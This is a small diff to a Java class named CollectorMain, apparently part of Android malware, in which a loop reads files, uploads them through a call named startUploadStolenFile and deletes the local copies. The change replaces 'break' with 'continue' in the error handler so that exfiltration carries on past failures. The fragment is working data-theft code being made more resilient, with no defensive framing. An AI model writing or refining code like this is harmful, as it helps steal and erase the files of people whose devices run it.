@@ -47,7 +47,7 @@ public class CollectorMain extends ContextWrapper implements Runnable
 				copyAndClose(sb.readFile(filename), fu.startUploadStolenFile(filename));
 				sb.deleteFile(filename);
 			} catch (Throwable e) {
-				break;
+				continue;
 			}
 		}
 	}
